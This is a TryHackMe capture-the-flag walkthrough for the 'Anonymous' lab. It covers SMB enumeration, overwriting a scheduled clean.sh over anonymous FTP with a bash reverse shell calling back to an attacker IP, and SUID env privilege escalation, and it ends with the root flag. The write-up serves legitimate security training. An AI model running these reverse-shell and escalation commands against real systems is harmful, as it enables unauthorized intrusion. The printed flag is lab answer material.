#   Tryhackme - Anonymous V6
##  export IP=

##  Walkthrough by:
```
Shaswata Saha
21-07-2023
12:33AM
```

##  Steps :
1.  Nmap scan:

2.  No http port so no website or gobuster scan.

3.  Smb client present so :
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ smbclient -L \\anonymous -I 10.10.2.178
Password for [WORKGROUP\subhro1530]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            ANONYMOUS

```

4.  Getting to the pics folder of SMB:
```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/AnonymousV6]
└─$ smbclient //10.10.2.178/pics    
Password for [WORKGROUP\subhro1530]:
Try "help" to get a list of possible commands.
smb: \> get *
NT_STATUS_OBJECT_NAME_INVALID opening remote file \*
smb: \> ls
  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Wed May 13 21:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020

                20508240 blocks of size 1024. 13306800 blocks available
smb: \> get corgo2.jpg 
getting file \corgo2.jpg of size 42663 as corgo2.jpg (19.2 KiloBytes/sec) (average 19.2 KiloBytes/sec)
smb: \> get puppos.jpeg 
getting file \puppos.jpeg of size 265188 as puppos.jpeg (70.8 KiloBytes/sec) (average 51.6 KiloBytes/sec)
smb: \> ^C

```
But the data is of no use.

5.  Getting to the ftp server anonymously . We find a _clean.sh_ file which is being run by the shell. So lets upload a reverse shell here in the name of _clean.sh_.

6.  Getting a bash reverse shell & changing contents of __clean.sh__:
```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/AnonymousV6]
└─$ cat clean.sh
#!/bin/bash
bash -i >& /dev/tcp/10.17.28.202/9999 0>&1  
```

7.  Uploading it to the ftp server. Getting a reverse shell on the port as well.

8.  We get the user flag..!

9.  ### Privelege escalation:
```bash
$ /usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
```
This code will spawn a root shell from the env folder which is vulnerable.

```bash
# ls
ls
pics  user.txt
# cd /root
cd /root
# ls
ls
root.txt
# cat root.txt 
cat root.txt
4d930091c31a622a7ed10f27999af363
# 
```

We hacked the root..!
